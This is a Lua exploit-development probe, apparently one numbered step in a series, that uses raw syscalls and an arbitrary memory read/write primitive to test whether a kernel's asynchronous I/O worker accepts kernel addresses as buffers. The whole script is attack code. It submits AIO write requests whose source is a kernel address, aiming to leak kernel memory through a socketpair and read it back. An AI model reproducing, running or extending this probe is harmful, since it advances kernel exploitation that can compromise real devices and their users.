-- CRASH_CLASS: MODERATE
-- PROBE 979a: does the aio worker validate the buffer as user memory?
--
-- Every aio probe so far used cmd=0x1001 (read) with a user buffer. The write
-- direction has never been submitted, and a kernel destination/source has only
-- been tried on the read path (926a/927a), where nothing dispatched. If the
-- worker calls copyin/copyout without a user-range check, a write op whose
-- source is a kernel address is a kernel read: it lands in the socketpair and
-- we read it back here. Kernel text/D are unmapped guesses are safe for copyin
-- (fault-buffered), so this only costs a process if pagetable state disagrees.

print("=== PROBE 979a: AIO DIRECTION / BUFFER VALIDATION ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function ret(rv) local h,l=hi_lo(rv) return h,l end

local pid = to_num(mk(20)())
print(string.format("[A] pid=%u", pid))

local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
local ok = pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("  socketpair ok=%s fds=%d,%d", tostring(ok), fd0, fd1))
if fd0 <= 0 then print("no socketpair"); return end

local buf = memory.alloc(0x100)
for i=0,0xFF,4 do wd(buf+i, 0x41414141) end
local ub = addr_of(buf)

local function submit(cmd, addr, len)
    local reqs = memory.alloc(0x28)
    local ids  = memory.alloc(8)
    local st   = memory.alloc(8)
    local err  = memory.alloc(8)
    for i=0,0x27,4 do wd(reqs+i,0) end
    wd(reqs+0x08, len)
    wd(reqs+0x10, addr % 4294967296) wd(reqs+0x14, math.floor(addr/4294967296))
    wd(reqs+0x20, fd0)
    local o1,rv = pcall(function() return mk(669)(uint64(cmd),uint64(reqs),uint64(1),uint64(3),uint64(ids)) end)
    local id = rd(ids)
    pcall(function() return mk(664)(uint64(ids),uint64(1),uint64(st)) end)
    local state = rd(st)
    wd(err, 0)
    local o2,rv2 = pcall(function() return mk(662)(uint64(ids),uint64(1),uint64(err)) end)
    local h,l = ret(o2 and rv2 or 0)
    return o1 and 0 or -1, id, state, rd(err)
end

print("[B] which cmd values dispatch with a USER buffer")
local valid = {}
for _, cmd in ipairs({0x1, 0x2, 0x4, 0x1001, 0x1002, 0x1004, 0x2001, 0x2002}) do
    local okc, id, state, err = submit(cmd, ub, 0x40)
    print(string.format("   cmd=0x%04X id=0x%08X state=%d delerr=0x%08X", cmd, id, state, err))
    if state == 2 or state == 3 then valid[#valid+1] = cmd end
end
print(string.format("   dispatching cmds: %d", #valid))
if #valid == 0 then print("[Z] no cmd dispatches with a user buffer"); print("=== COMPLETE ==="); return end

print("[C] same cmds, buffer = 0xFFFFFFFF80000000 (kernel)")
local KB = 0xFFFFFFFF80000000
for _, cmd in ipairs(valid) do
    local okc, id, state, err = submit(cmd, KB, 0x40)
    print(string.format("   cmd=0x%04X id=0x%08X state=%d delerr=0x%08X", cmd, id, state, err))
end

print("[D] drain the peer for anything the worker copied out")
local out = memory.alloc(0x200)
for i=0,0x1FF,4 do wd(out+i, 0) end
local n = -1
local o3, rv3 = pcall(function() return mk(29)(uint64(fd1),uint64(addr_of(out)),uint64(0x100),uint64(0x80)) end)
if o3 then n = to_num(rv3) end
print(string.format("   recvfrom -> %d", n))
if n and n > 0 then
    for i=0,math.min(n,64)-1,4 do
        print(string.format("     [%02X] %08X", i, rd(out+i)))
    end
end

print(string.format("[Z] alive pid=%d", to_num(mk(20)())))
print("=== COMPLETE ===")
